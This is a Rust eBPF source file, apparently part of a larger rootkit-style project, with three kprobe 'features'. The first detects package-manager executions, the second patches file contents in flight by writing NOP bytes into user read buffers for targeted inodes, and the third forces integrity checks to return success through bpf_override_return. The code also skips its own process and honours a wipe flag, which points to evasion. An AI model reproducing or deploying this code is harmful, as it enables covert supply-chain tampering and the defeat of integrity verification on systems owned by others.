use aya_ebpf::{
    helpers::{
        bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel, bpf_probe_write_user,
    },
    macros::kprobe,
    programs::ProbeContext,
    EbpfContext,
};
use common::{
    EventHeader, EVENT_BINARY_PATCHED_INFLIGHT, EVENT_INTEGRITY_BYPASSED, EVENT_PKG_MANAGER_HOOKED,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 67: Package Manager Hook
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_execve_supply(ctx: ProbeContext) -> u32 {
    try_execve_supply(&ctx).unwrap_or_default()
}

fn try_execve_supply(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let enabled = match unsafe { EXECVE_MONITOR_STATE.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    if enabled == 0 {
        return Ok(0);
    }

    let filename_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let first_8: [u8; 8] = unsafe { bpf_probe_read_kernel(filename_ptr as *const [u8; 8])? };

    let mut path_hash: u64 = 0x517cc1b727220a95;
    for &b in first_8.iter() {
        path_hash ^= b as u64;
        path_hash = path_hash.wrapping_mul(0x6c62272e07bb0142);
    }

    if unsafe { PKG_MANAGER_HASHES.get(&path_hash) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_PKG_MANAGER_HOOKED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: path_hash,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 68: Binary Patching In-Flight
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_vfs_read_supply(ctx: ProbeContext) -> u32 {
    try_vfs_read_supply(&ctx).unwrap_or_default()
}

fn try_vfs_read_supply(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let file_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let inode_ptr: u64 = unsafe { bpf_probe_read_kernel((file_ptr + 32) as *const u64)? };
    let ino: u64 = unsafe { bpf_probe_read_kernel((inode_ptr + 64) as *const u64)? };

    if let Some(target) = unsafe { SUPPLY_PATCH_TABLE.get(&ino) } {
        let buf_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
        let patch_addr = buf_ptr + target.patch_offset as u64;

        let patch_data: [u8; 8] = [0x90; 8]; // NOP sled
        unsafe {
            let _ = bpf_probe_write_user(patch_addr as *mut [u8; 8], &patch_data as *const [u8; 8]);
        }

        let event = EventHeader {
            event_type: EVENT_BINARY_PATCHED_INFLIGHT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ino,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 69: Integrity Check Bypass
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_integrity_bypass(ctx: ProbeContext) -> u32 {
    try_integrity_bypass(&ctx).unwrap_or_default()
}

fn try_integrity_bypass(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let file_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let inode_ptr: u64 = unsafe { bpf_probe_read_kernel((file_ptr + 32) as *const u64)? };
    let ino: u64 = unsafe { bpf_probe_read_kernel((inode_ptr + 64) as *const u64)? };

    if unsafe { SUPPLY_PATCH_TABLE.get(&ino) }.is_some() {
        #[cfg(target_arch = "bpf")]
        unsafe {
            let _ = aya_ebpf::helpers::gen::bpf_override_return(ctx.as_ptr() as *mut _, 0u64);
        }

        let event = EventHeader {
            event_type: EVENT_INTEGRITY_BYPASSED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ino,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
